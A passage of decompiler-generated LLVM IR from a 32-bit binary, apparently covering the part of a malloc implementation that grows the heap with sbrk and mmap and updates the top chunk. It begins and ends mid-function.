  br i1 %v5_8052d8e, label %dec_label_pc_8052d94, label %dec_label_pc_8052e4e

dec_label_pc_8052d94:                             ; preds = %dec_label_pc_8052d83
  %v2_8052d96 = add i32 %v1_8052d96, 10
  %v3_8052d96 = add i32 %v2_8052d96, %v0_8052d3f
  %v1_8052d9a = sub i32 0, %v0_8052d3f
  store i32 %v1_8052d9a, i32* %eax.global-to-local, align 4
  %v2_8052d9c = and i32 %v3_8052d96, %v1_8052d9a
  store i32 %v2_8052d9c, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8052d9c, %v1_8052d96
  br i1 %tmp139, label %dec_label_pc_8052da8, label %dec_label_pc_8052e4e

dec_label_pc_8052da8:                             ; preds = %dec_label_pc_8052d94
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052db5 = call i32 @mmap(i32 0, i32 %v2_8052d9c, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052d70, i32 %v1_8052d70)
  store i32 %v8_8052db5, i32* %eax.global-to-local, align 4
  %v10_8052dbd = icmp eq i32 %v8_8052db5, -1
  store i32 %v8_8052db5, i32* %edx.global-to-local, align 4
  br i1 %v10_8052dbd, label %dec_label_pc_8052da8.dec_label_pc_8052e4e_crit_edge, label %dec_label_pc_8052dc8

dec_label_pc_8052da8.dec_label_pc_8052e4e_crit_edge: ; preds = %dec_label_pc_8052da8
  %v0_8052e4e.pre = load i32, i32* @global_var_8067a4c.235, align 4
  br label %dec_label_pc_8052e4e

dec_label_pc_8052dc8:                             ; preds = %dec_label_pc_8052da8
  %v1_8052dca = urem i32 %v8_8052db5, 8
  %v2_8052dca = icmp eq i32 %v1_8052dca, 0
  store i32 %v1_8052dca, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052dca, label %dec_label_pc_8052de3, label %dec_label_pc_8052dcf

dec_label_pc_8052dcf:                             ; preds = %dec_label_pc_8052dc8
  %v0_8052dd4 = load i32, i32* @ebx, align 4
  %v2_8052dd6 = sub nsw i32 8, %v1_8052dca
  store i32 %v2_8052dd6, i32* %eax.global-to-local, align 4
  %v2_8052dd8 = add i32 %v2_8052dd6, %v8_8052db5
  store i32 %v2_8052dd8, i32* @ecx, align 4
  %v2_8052ddb = sub i32 %v0_8052dd4, %v2_8052dd6
  store i32 %v2_8052ddb, i32* %esi.global-to-local, align 4
  %v2_8052ddd = inttoptr i32 %v2_8052dd8 to i32*
  store i32 %v2_8052dd6, i32* %v2_8052ddd, align 4
  br label %dec_label_pc_8052ded

dec_label_pc_8052de3:                             ; preds = %dec_label_pc_8052dc8
  store i32 %v8_8052db5, i32* @ecx, align 4
  %v1_8052de5 = inttoptr i32 %v8_8052db5 to i32*
  store i32 0, i32* %v1_8052de5, align 4
  br label %dec_label_pc_8052ded

dec_label_pc_8052ded:                             ; preds = %dec_label_pc_8052dcf, %dec_label_pc_8052de3
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052dcf ], [ @ebx, %dec_label_pc_8052de3 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052ded = or i32 %storemerge, 2
  %v1_8052df0 = load i32, i32* @ecx, align 4
  %v2_8052df0 = add i32 %v1_8052df0, 4
  %v3_8052df0 = inttoptr i32 %v2_8052df0 to i32*
  store i32 %v1_8052ded, i32* %v3_8052df0, align 4
  %v0_8052df3 = load i32, i32* @global_var_8067d70.242, align 16
  %v0_8052df8 = load i32, i32* @global_var_8067d90.244, align 16
  %v1_8052dfe = add i32 %v0_8052df3, 1
  %v1_8052dff = load i32, i32* @global_var_8067d78.245, align 8
  %v2_8052dff = sub i32 %v1_8052dfe, %v1_8052dff
  %v8_8052dff = xor i32 %v1_8052dff, %v1_8052dfe
  %v9_8052dff = xor i32 %v2_8052dff, %v1_8052dfe
  %v10_8052dff = and i32 %v9_8052dff, %v8_8052dff
  %v11_8052dff = icmp slt i32 %v10_8052dff, 0
  %v12_8052dff = icmp eq i32 %v2_8052dff, 0
  %v13_8052dff = icmp slt i32 %v2_8052dff, 0
  store i32 %v1_8052dfe, i32* @global_var_8067d70.242, align 16
  %v3_8052e0a = icmp ne i1 %v13_8052dff, %v11_8052dff
  %v4_8052e0a = or i1 %v12_8052dff, %v3_8052e0a
  %v7_8052e0a = select i1 %v4_8052e0a, i32 %v1_8052dff, i32 %v1_8052dfe
  store i32 %v7_8052e0a, i32* @global_var_8067d78.245, align 8
  %v0_8052e16 = load i32, i32* @global_var_8067d84.246, align 4
  %v1_8052e1b = load i32, i32* @ebx, align 4
  %v2_8052e1b = add i32 %v1_8052e1b, %v0_8052e16
  store i32 %v2_8052e1b, i32* @global_var_8067d84.246, align 4
  %tmp86 = icmp ule i32 %v2_8052e1b, %v0_8052df8
  %v5_8052e28 = select i1 %tmp86, i32 %v0_8052df8, i32 %v2_8052e1b
  store i32 %v5_8052e28, i32* %edx.global-to-local, align 4
  %v1_8052e2b = load i32, i32* @global_var_8067d88.247, align 8
  %v2_8052e2b = add i32 %v1_8052e2b, %v2_8052e1b
  store i32 %v5_8052e28, i32* @global_var_8067d90.244, align 16
  %v1_8052e37 = load i32, i32* @global_var_8067d94.248, align 4
  %tmp140 = icmp ule i32 %v2_8052e2b, %v1_8052e37
  %v5_8052e3d = select i1 %tmp140, i32 %v1_8052e37, i32 %v2_8052e2b
  store i32 %v5_8052e3d, i32* %eax.global-to-local, align 4
  store i32 %v5_8052e3d, i32* @global_var_8067d94.248, align 4
  br label %dec_label_pc_8052cf9

dec_label_pc_8052e4e:                             ; preds = %dec_label_pc_8052d94, %dec_label_pc_8052da8.dec_label_pc_8052e4e_crit_edge, %dec_label_pc_8052d83, %dec_label_pc_8052d6c
  %v0_8052e4e = phi i32 [ %v0_8052e4e.pre, %dec_label_pc_8052da8.dec_label_pc_8052e4e_crit_edge ], [ %v0_8052d01, %dec_label_pc_8052d83 ], [ %v0_8052d01, %dec_label_pc_8052d94 ], [ %v0_8052d01, %dec_label_pc_8052d6c ]
  store i32 %v0_8052e4e, i32* %eax.global-to-local, align 4
  %v1_8052e57 = add i32 %v0_8052e4e, 4
  %v2_8052e57 = inttoptr i32 %v1_8052e57 to i32*
  %v3_8052e57 = load i32, i32* %v2_8052e57, align 4
  %v1_8052e5e = and i32 %v3_8052e57, -4
  %v2_8052e5e = icmp eq i32 %v1_8052e5e, 0
  store i32 %v1_8052e5e, i32* @ebp, align 4
  %v1_8052e64 = load i32, i32* @global_var_8067d68.249, align 8
  %v0_8052e6e = load i8, i8* @global_var_8067d80.250, align 128
  %v1_8052e6e = urem i8 %v0_8052e6e, 2
  %v2_8052e6e = icmp eq i8 %v1_8052e6e, 0
  %v1_8052e75 = icmp eq i1 %v2_8052e6e, false
  %v1_8052e5e.op = sub i32 0, %v1_8052e5e
  %v2_8052e6c.neg = select i1 %v1_8052e75, i32 %v1_8052e5e.op, i32 0
  %v2_8052e64 = add i32 %v1_8052d70, %v1_8052d0e
  %v4_8052e75 = add i32 %v2_8052e64, %v1_8052e64
  %v5_8052e7c = add i32 %v4_8052e75, %v2_8052e6c.neg
  store i32 %v5_8052e7c, i32* %eax.global-to-local, align 4
  %v1_8052e80 = sub i32 0, %v0_8052d3f
  store i32 %v1_8052e80, i32* %edx.global-to-local, align 4
  %v2_8052e84 = and i32 %v5_8052e7c, %v1_8052e80
  store i32 %v2_8052e84, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8052e84, 1
  br i1 %tmp87, label %dec_label_pc_8052ea2, label %dec_label_pc_8052e8c

dec_label_pc_8052e8c:                             ; preds = %dec_label_pc_8052e4e
  store i32 %v2_8052e84, i32* %stack_var_-92, align 4
  %v1_8052e90 = call i32 @__GI_sbrk(i32 %v2_8052e84)
  store i32 %v1_8052e90, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v10_8052e9b = icmp eq i32 %v1_8052e90, -1
  store i32 %v1_8052e90, i32* @ebx, align 4
  %v1_8052ea0 = icmp eq i1 %v10_8052e9b, false
  br i1 %v1_8052ea0, label %dec_label_pc_8052ef9, label %dec_label_pc_8052e8c.dec_label_pc_8052ea2_crit_edge

dec_label_pc_8052e8c.dec_label_pc_8052ea2_crit_edge: ; preds = %dec_label_pc_8052e8c
  %v0_8052ea2.pre = load i8, i8* @global_var_8067d80.250, align 128
  br label %dec_label_pc_8052ea2

dec_label_pc_8052ea2:                             ; preds = %dec_label_pc_8052e8c.dec_label_pc_8052ea2_crit_edge, %dec_label_pc_8052e4e
  %v0_8052ecf = phi i32 [ -1, %dec_label_pc_8052e8c.dec_label_pc_8052ea2_crit_edge ], [ %v1_8052e80, %dec_label_pc_8052e4e ]
  %v0_8052ea2 = phi i8 [ %v0_8052ea2.pre, %dec_label_pc_8052e8c.dec_label_pc_8052ea2_crit_edge ], [ %v0_8052e6e, %dec_label_pc_8052e4e ]
  %v1_8052ea2 = urem i8 %v0_8052ea2, 2
  %v2_8052ea2 = icmp eq i8 %v1_8052ea2, 0
  br i1 %v2_8052ea2, label %dec_label_pc_8052ea2.dec_label_pc_8052eb7_crit_edge, label %dec_label_pc_8052eab

dec_label_pc_8052ea2.dec_label_pc_8052eb7_crit_edge: ; preds = %dec_label_pc_8052ea2
  %v0_8052eb7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052eb7

dec_label_pc_8052eab:                             ; preds = %dec_label_pc_8052ea2
  %v2_8052eaf = add i32 %v1_8052e5e, %v1_8052d70
  store i32 %v2_8052eaf, i32* %eax.global-to-local, align 4
  %v0_8052eb1 = load i32, i32* @esi, align 4
  %v2_8052eb1 = add i32 %v0_8052eb1, %v2_8052eaf
  %v5_8052eb3 = and i32 %v2_8052eb1, %v1_8052e80
  store i32 %v5_8052eb3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052eb7

dec_label_pc_8052eb7:                             ; preds = %dec_label_pc_8052ea2.dec_label_pc_8052eb7_crit_edge, %dec_label_pc_8052eab
  %v3_8052ec2 = phi i32 [ %v0_8052eb7.pre, %dec_label_pc_8052ea2.dec_label_pc_8052eb7_crit_edge ], [ %v5_8052eb3, %dec_label_pc_8052eab ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8052ec2, 1048576
  %v5_8052ec2 = select i1 %tmp88, i32 1048576, i32 %v3_8052ec2
  store i32 %v5_8052ec2, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_8052ec2, %v1_8052d96
  br i1 %tmp141, label %dec_label_pc_8052ecf, label %dec_label_pc_8053114

dec_label_pc_8052ecf:                             ; preds = %dec_label_pc_8052eb7
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052edc = call i32 @mmap(i32 0, i32 %v5_8052ec2, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052ecf, i32 %v0_8052ecf)
  store i32 %v8_8052edc, i32* %eax.global-to-local, align 4
  %v10_8052ee4 = icmp eq i32 %v8_8052edc, -1
  store i32 %v8_8052edc, i32* @ebx, align 4
  br i1 %v10_8052ee4, label %dec_label_pc_8053114, label %dec_label_pc_8052eef

dec_label_pc_8052eef:                             ; preds = %dec_label_pc_8052ecf
  %v0_8052eef = load i8, i8* @global_var_8067d80.250, align 1
  %v2_8052eef = and i8 %v0_8052eef, -2
  store i8 %v2_8052eef, i8* @global_var_8067d80.250, align 128
  %v1_8052ef6 = load i32, i32* @esi, align 4
  %v2_8052ef6 = add i32 %v1_8052ef6, %v8_8052edc
  store i32 %v2_8052ef6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052ef9

dec_label_pc_8052ef9:                             ; preds = %dec_label_pc_8052e8c, %dec_label_pc_8052eef
  %v0_8052fc0 = phi i32 [ -1, %dec_label_pc_8052e8c ], [ %v2_8052ef6, %dec_label_pc_8052eef ]
  %v0_8052fce = phi i32 [ %v1_8052e90, %dec_label_pc_8052e8c ], [ %v8_8052edc, %dec_label_pc_8052eef ]
  %v10_8052ef9 = icmp eq i32 %v0_8052fce, -1
  br i1 %v10_8052ef9, label %dec_label_pc_8053114, label %dec_label_pc_8052f02

dec_label_pc_8052f02:                             ; preds = %dec_label_pc_8052ef9
  %v0_8052f06 = load i32, i32* @global_var_8067d88.247, align 8
  %v1_8052f06 = load i32, i32* @esi, align 4
  %v2_8052f06 = add i32 %v1_8052f06, %v0_8052f06
  store i32 %v2_8052f06, i32* @global_var_8067d88.247, align 8
  %v2_8052f0c = add i32 %v1_8052e5e, %v0_8052e4e
  store i32 %v2_8052f0c, i32* %ecx.global-to-local, align 4
  %v2_8052f0e = sub i32 %v0_8052fce, %v2_8052f0c
  %v7_8052f0e = icmp ult i32 %v0_8052fce, %v2_8052f0c
  %v12_8052f0e = icmp eq i32 %v2_8052f0e, 0
  %v1_8052f10 = icmp eq i1 %v12_8052f0e, false
  br i1 %v1_8052f10, label %dec_label_pc_8052f29, label %dec_label_pc_8052f12

dec_label_pc_8052f12:                             ; preds = %dec_label_pc_8052f02
  %v10_8052f12 = icmp eq i32 %v0_8052fc0, -1
  %v1_8052f15 = icmp eq i1 %v10_8052f12, false
  br i1 %v1_8052f15, label %dec_label_pc_8052f29, label %dec_label_pc_8052f17

dec_label_pc_8052f17:                             ; preds = %dec_label_pc_8052f12
  store i32 %v0_8052e4e, i32* %ecx.global-to-local, align 4
  %v2_8052f1b = add i32 %v1_8052f06, %v1_8052e5e
  %v1_8052f1e = or i32 %v2_8052f1b, 1
  store i32 %v1_8052f1e, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f1e, i32* %v2_8052e57, align 4
  br label %dec_label_pc_8053056

dec_label_pc_8052f29:                             ; preds = %dec_label_pc_8052f12, %dec_label_pc_8052f02
  %v0_8052f29 = load i8, i8* @global_var_8067d80.250, align 1
  %v1_8052f29 = sext i8 %v0_8052f29 to i32
  store i32 %v1_8052f29, i32* %eax.global-to-local, align 4
  %v2_8052f2e = urem i8 %v0_8052f29, 2
  %v3_8052f2e = icmp eq i8 %v2_8052f2e, 0
  br i1 %v3_8052f2e, label %dec_label_pc_8052f42, label %dec_label_pc_8052f32

dec_label_pc_8052f32:                             ; preds = %dec_label_pc_8052f29
  br i1 %v2_8052e5e, label %dec_label_pc_8052f42, label %dec_label_pc_8052f36

dec_label_pc_8052f36:                             ; preds = %dec_label_pc_8052f32
  %v1_8052f38 = icmp eq i1 %v7_8052f0e, false
  br i1 %v1_8052f38, label %dec_label_pc_8052f42, label %dec_label_pc_8052f3a

dec_label_pc_8052f3a:                             ; preds = %dec_label_pc_8052f36
  %v1_8052f3a = and i32 %v1_8052f29, -2
  %v4_8052f3a = trunc i32 %v1_8052f3a to i8
  store i32 %v1_8052f3a, i32* %eax.global-to-local, align 4
  store i8 %v4_8052f3a, i8* @global_var_8067d80.250, align 128
  br label %dec_label_pc_8052f42

dec_label_pc_8052f42:                             ; preds = %dec_label_pc_8052f36, %dec_label_pc_8052f32, %dec_label_pc_8052f29, %dec_label_pc_8052f3a
  %v0_8052f42 = phi i8 [ %v0_8052f29, %dec_label_pc_8052f36 ], [ %v0_8052f29, %dec_label_pc_8052f32 ], [ %v0_8052f29, %dec_label_pc_8052f29 ], [ %v4_8052f3a, %dec_label_pc_8052f3a ]
  %v1_8052f42 = urem i8 %v0_8052f42, 2
  %v2_8052f42 = icmp eq i8 %v1_8052f42, 0
  br i1 %v2_8052f42, label %dec_label_pc_8052fc0, label %dec_label_pc_8052f4b

dec_label_pc_8052f4b:                             ; preds = %dec_label_pc_8052f42
  br i1 %v2_8052e5e, label %dec_label_pc_8052f59, label %dec_label_pc_8052f4f

dec_label_pc_8052f4f:                             ; preds = %dec_label_pc_8052f4b
  store i32 %v2_8052f0e, i32* %eax.global-to-local, align 4
  %v2_8052f53 = add i32 %v2_8052f06, %v2_8052f0e
  store i32 %v2_8052f53, i32* @global_var_8067d88.247, align 8
  br label %dec_label_pc_8052f59

dec_label_pc_8052f59:                             ; preds = %dec_label_pc_8052f4b, %dec_label_pc_8052f4f
  %v1_8052f5b = urem i32 %v0_8052fce, 8
  %v2_8052f5b = icmp eq i32 %v1_8052f5b, 0
  store i32 %v1_8052f5b, i32* %edx.global-to-local, align 4
  %v1_8052f5e = icmp eq i1 %v2_8052f5b, false
  br i1 %v1_8052f5e, label %dec_label_pc_8052f66, label %dec_label_pc_8052f60

dec_label_pc_8052f60:                             ; preds = %dec_label_pc_8052f59
  store i32 %v0_8052fce, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f70

dec_label_pc_8052f66:                             ; preds = %dec_label_pc_8052f59
  %v2_8052f6b = sub nsw i32 8, %v1_8052f5b
  store i32 %v2_8052f6b, i32* %eax.global-to-local, align 4
  %v2_8052f6d = add i32 %v2_8052f6b, %v0_8052fce
  store i32 %v2_8052f6d, i32* @edi, align 4
  br label %dec_label_pc_8052f70

dec_label_pc_8052f70:                             ; preds = %dec_label_pc_8052f60, %dec_label_pc_8052f66
  %v0_8052f7d = phi i32 [ 0, %dec_label_pc_8052f60 ], [ %v2_8052f6b, %dec_label_pc_8052f66 ]
  %v2_8052f70 = add i32 %v1_8052f06, %v0_8052fce
  %v2_8052f7d = add i32 %v0_8052f7d, %v1_8052e5e
  store i32 %v2_8052f7d, i32* %ecx.global-to-local, align 4
  %v2_8052f80 = add i32 %v2_8052f7d, %v2_8052f70
  store i32 %v2_8052f80, i32* %edx.global-to-local, align 4
  %v2_8052f82 = add i32 %v2_8052f80, %v1_8052d70
  %v5_8052f85 = and i32 %v2_8052f82, %v1_8052e80
  %v2_8052f8c = sub i32 %v5_8052f85, %v2_8052f80
  store i32 %v2_8052f8c, i32* %eax.global-to-local, align 4
  %v2_8052f8e = add i32 %v2_8052f8c, %v2_8052f7d
  store i32 %v2_8052f8e, i32* @esi, align 4
  store i32 %v2_8052f8e, i32* %stack_var_-92, align 4
  %v1_8052f92 = call i32 @__GI_sbrk(i32 %v2_8052f8e)
  store i32 %v1_8052f92, i32* %eax.global-to-local, align 4
  %v10_8052f9a = icmp eq i32 %v1_8052f92, -1
  store i32 %v1_8052f92, i32* %edx.global-to-local, align 4
  %v1_8052f9f = icmp eq i1 %v10_8052f9a, false
  br i1 %v1_8052f9f, label %dec_label_pc_8052faf, label %dec_label_pc_8052fa1

dec_label_pc_8052fa1:                             ; preds = %dec_label_pc_8052f70
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052fa6 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052fa6, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fa6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052fe3

dec_label_pc_8052faf:                             ; preds = %dec_label_pc_8052f70
  %v1_8052faf = load i32, i32* @ebx, align 4
  %v7_8052faf = icmp ult i32 %v1_8052f92, %v1_8052faf
  %v1_8052fb1 = icmp eq i1 %v7_8052faf, false
  br i1 %v1_8052fb1, label %dec_label_pc_8052fe8, label %dec_label_pc_8052fb3

dec_label_pc_8052fb3:                             ; preds = %dec_label_pc_8052faf
  %v0_8052fb3 = load i8, i8* @global_var_8067d80.250, align 1
  %v2_8052fb3 = and i8 %v0_8052fb3, -2
  store i8 %v2_8052fb3, i8* @global_var_8067d80.250, align 128
  store i32 %v2_8052f70, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052fc7

dec_label_pc_8052fc0:                             ; preds = %dec_label_pc_8052f42
  %v10_8052fc0 = icmp eq i32 %v0_8052fc0, -1
  br i1 %v10_8052fc0, label %dec_label_pc_8052fcb, label %dec_label_pc_8052fc5

dec_label_pc_8052fc5:                             ; preds = %dec_label_pc_8052fc0
  store i32 %v0_8052fce, i32* @edi, align 4
  br label %dec_label_pc_8052fc7

dec_label_pc_8052fc7:                             ; preds = %dec_label_pc_8052fb3, %dec_label_pc_8052fc5
  %v0_8052fe847 = phi i32 [ %v2_8052f70, %dec_label_pc_8052fb3 ], [ %v0_8052fc0, %dec_label_pc_8052fc5 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052fe8

dec_label_pc_8052fcb:                             ; preds = %dec_label_pc_8052fc0
  store i32 %v0_8052fce, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052fd2 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052fd2, i32* %edx.global-to-local, align 4
  %v1_8052fd9 = load i32, i32* @ebx, align 4
  %v2_8052fd9 = sub i32 %v1_8052fd2, %v1_8052fd9
  %v1_8052fdb = load i32, i32* @esi, align 4
  %v2_8052fdb = sub i32 %v2_8052fd9, %v1_8052fdb
  store i32 %v2_8052fdb, i32* %eax.global-to-local, align 4
  %v0_8052fdd = load i32, i32* @global_var_8067d88.247, align 8
  %v2_8052fdd = add i32 %v0_8052fdd, %v2_8052fdb
  store i32 %v2_8052fdd, i32* @global_var_8067d88.247, align 8
  br label %dec_label_pc_8052fe3

dec_label_pc_8052fe3:                             ; preds = %dec_label_pc_8052fa1, %dec_label_pc_8052fcb
  %v0_8052fe846 = phi i32 [ %v1_8052fa6, %dec_label_pc_8052fa1 ], [ %v1_8052fd2, %dec_label_pc_8052fcb ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052fe8

dec_label_pc_8052fe8:                             ; preds = %dec_label_pc_8052faf, %dec_label_pc_8052fc7, %dec_label_pc_8052fe3
  %v0_8052fed = phi i32 [ %v1_8052f92, %dec_label_pc_8052faf ], [ %v0_8052fe847, %dec_label_pc_8052fc7 ], [ %v0_8052fe846, %dec_label_pc_8052fe3 ]
  %v10_8052fe8 = icmp eq i32 %v0_8052fed, -1
  br i1 %v10_8052fe8, label %dec_label_pc_8053056, label %dec_label_pc_8052fed

dec_label_pc_8052fed:                             ; preds = %dec_label_pc_8052fe8
  %v1_8052fed = load i32, i32* @edi, align 4
  %v2_8052fed = sub i32 %v0_8052fed, %v1_8052fed
  store i32 %v2_8052fed, i32* %edx.global-to-local, align 4
  %v1_8052fef = load i32, i32* @esi, align 4
  %v2_8052fef = add i32 %v1_8052fef, %v2_8052fed
  %v1_8052ff2 = or i32 %v2_8052fef, 1
  store i32 %v1_8052ff2, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fed, i32* @global_var_8067a4c.235, align 4
  %v2_8052ffb = add i32 %v1_8052fed, 4
  %v3_8052ffb = inttoptr i32 %v2_8052ffb to i32*
  store i32 %v1_8052ff2, i32* %v3_8052ffb, align 4
  %v0_8052ffe = load i32, i32* @global_var_8067d88.247, align 8
  %v1_8052ffe = load i32, i32* @esi, align 4
  %v2_8052ffe = add i32 %v1_8052ffe, %v0_8052ffe
  store i32 %v2_8052ffe, i32* @global_var_8067d88.247, align 8
  br i1 %v2_8052e5e, label %dec_label_pc_8053056, label %dec_label_pc_8053008

dec_label_pc_8053008:                             ; preds = %dec_label_pc_8052fed
  store i32 %v0_8052e4e, i32* @ecx, align 4
  %v1_805300c = add i32 %v1_8052e5e, -12
  %v1_805300f = and i32 %v1_805300c, -8
  store i32 %v1_805300f, i32* %eax.global-to-local, align 4
  %v1_8053014 = or i32 %v1_805300f, 1
  store i32 %v1_8053014, i32* %edx.global-to-local, align 4
  %v5_8053017 = icmp ult i32 %v1_805300f, 15
  store i32 %v1_8053014, i32* %v2_8052e57, align 4
  %v0_805301d = load i32, i32* @ecx, align 4
  %v1_805301d = load i32, i32* %eax.global-to-local, align 4
  %v2_805301d = add i32 %v0_805301d, 4
  %v3_805301d = add i32 %v2_805301d, %v1_805301d
  %v4_805301d = inttoptr i32 %v3_805301d to i32*
  store i32 5, i32* %v4_805301d, align 4
  %v0_8053025 = load i32, i32* @ecx, align 4
  %v1_8053025 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053025 = add i32 %v0_8053025, 8
  %v3_8053025 = add i32 %v2_8053025, %v1_8053025
  %v4_8053025 = inttoptr i32 %v3_8053025 to i32*
  store i32 5, i32* %v4_8053025, align 4
  br i1 %v5_8053017, label %dec_label_pc_8053056, label %dec_label_pc_805302f

dec_label_pc_805302f:                             ; preds = %dec_label_pc_8053008
  %v0_805302f = load i32, i32* @global_var_8067d64.251, align 4
  store i32 %v0_805302f, i32* @ebx, align 4
  %v0_8053035 = load i32, i32* @ecx, align 4
  %v1_805303a = add i32 %v0_8053035, 8
  store i32 %v1_805303a, i32* %eax.global-to-local, align 4
  store i32 %v1_805303a, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8067d64.251, align 4
  %v1_8053048 = call i32 @free(i32 %v1_805303a)
  store i32 %v1_8053048, i32* %eax.global-to-local, align 4
  %v0_8053050 = load i32, i32* @ebx, align 4
  store i32 %v0_8053050, i32* @global_var_8067d64.251, align 4
  br label %dec_label_pc_8053056

dec_label_pc_8053056:                             ; preds = %dec_label_pc_8053008, %dec_label_pc_8052fed, %dec_label_pc_8052fe8, %dec_label_pc_8052f17, %dec_label_pc_805302f
  %v0_8053056 = load i32, i32* @global_var_8067d88.247, align 8
  %v0_805305b = load i32, i32* @global_var_8067d8c.252, align 4
  %v0_8053067 = load i32, i32* @global_var_8067a4c.235, align 4
  store i32 %v0_8053067, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_8053056, %v0_805305b
  %v5_805306d = select i1 %tmp89, i32 %v0_805305b, i32 %v0_8053056
  store i32 %v5_805306d, i32* %edx.global-to-local, align 4
  %v1_8053070 = load i32, i32* @global_var_8067d84.246, align 4
  %v2_8053070 = add i32 %v1_8053070, %v0_8053056
  store i32 %v5_805306d, i32* @global_var_8067d8c.252, align 4
  %v1_805307c = load i32, i32* @global_var_8067d94.248, align 4
  %tmp90 = icmp ule i32 %v2_8053070, %v1_805307c
  %v5_8053082 = select i1 %tmp90, i32 %v1_805307c, i32 %v2_8053070
  store i32 %v5_8053082, i32* %eax.global-to-local, align 4
  store i32 %v5_8053082, i32* @global_var_8067d94.248, align 4
  %v1_805308e = add i32 %v0_8053067, 4
  %v2_805308e = inttoptr i32 %v1_805308e to i32*
  %v3_805308e = load i32, i32* %v2_805308e, align 4
  %v1_8053091 = and i32 %v3_805308e, -4
  store i32 %v1_8053091, i32* @ecx, align 4
  %v10_8053094 = icmp ult i32 %v1_8053091, %v1_8052d0e
  br i1 %v10_8053094, label %dec_label_pc_8053114, label %dec_label_pc_805309a

dec_label_pc_805309a:                             ; preds = %dec_label_pc_8053056
  store i32 %v1_8052d96, i32* %esi.global-to-local, align 4
  %v2_80530a0 = sub i32 %v1_8053091, %v1_8052d96
  store i32 %v2_80530a0, i32* %ecx.global-to-local, align 4
  %v2_80530a2 = add i32 %v0_8053067, %v1_8052d96
  store i32 %v2_80530a2, i32* %edx.global-to-local, align 4
  %v1_80530a5 = or i32 %v1_8052d96, 1
  store i32 %v1_80530a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80530a2, i32* @global_var_8067a4c.235, align 4
  store i32 %v1_80530a5, i32* %v2_805308e, align 4
  %v0_80530b1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530b1

dec_label_pc_80530b1:                             ; preds = %dec_label_pc_8052d1c, %dec_label_pc_805309a
  %v0_80530b1 = phi i32 [ %v5_8052d2f, %dec_label_pc_8052d1c ], [ %v0_80530b1.pre, %dec_label_pc_805309a ]
  %v1_80530b1 = or i32 %v0_80530b1, 1
  store i32 %v1_80530b1, i32* @ecx, align 4
  %v0_80530b4 = load i32, i32* @ebx, align 4
  %v1_80530b4 = add i32 %v0_80530b4, 8
  store i32 %v1_80530b4, i32* @ebx, align 4
  %v1_80530b7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80530b7 = add i32 %v1_80530b7, 4
  %v3_80530b7 = inttoptr i32 %v2_80530b7 to i32*
  store i32 %v1_80530b1, i32* %v3_80530b7, align 4
  br label %dec_label_pc_8053121

dec_label_pc_80530bc:                             ; preds = %dec_label_pc_8052ace
  %v5_80530c2 = sub i32 %v1_8052ab1, %v1_8052d96
  store i32 %v5_80530c2, i32* %eax.global-to-local, align 4
  %v2_80530c6 = add i32 %v0_8052b7c118, %v1_8052d96
  store i32 %v2_80530c6, i32* %edx.global-to-local, align 4
  %v1_80530ca = or i32 %v1_8052d96, 1
  store i32 %v2_80530c6, i32* @global_var_8067a50.236, align 16
  store i32 %v1_80530ca, i32* %v2_8052aab, align 4
  %v0_80530d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530d8 = or i32 %v0_80530d6, 1
  store i32 %v1_80530d8, i32* @ecx, align 4
  %v0_80530db = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80530db, i32* @global_var_8067a5c.253, align 4
  store i32 %v0_80530db, i32* @global_var_8067a60.238, align 32
  %v1_80530e7 = add i32 %v0_80530db, 8
  %v2_80530e7 = inttoptr i32 %v1_80530e7 to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_80530e7, align 4
  %v0_80530ee = load i32, i32* %edx.global-to-local, align 4
  %v1_80530ee = add i32 %v0_80530ee, 12
  %v2_80530ee = inttoptr i32 %v1_80530ee to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_80530ee, align 4
  %v0_80530f5 = load i32, i32* @ecx, align 4
  %v1_80530f5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80530f5 = add i32 %v1_80530f5, 4
  %v3_80530f5 = inttoptr i32 %v2_80530f5 to i32*
  store i32 %v0_80530f5, i32* %v3_80530f5, align 4
  %v0_80530f8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530f8 = load i32, i32* %edx.global-to-local, align 4
  %v3_80530f8 = add i32 %v1_80530f8, %v0_80530f8
  %v4_80530f8 = inttoptr i32 %v3_80530f8 to i32*
  store i32 %v0_80530f8, i32* %v4_80530f8, align 4
  br label %dec_label_pc_8053106

dec_label_pc_80530fd:                             ; preds = %dec_label_pc_8052add
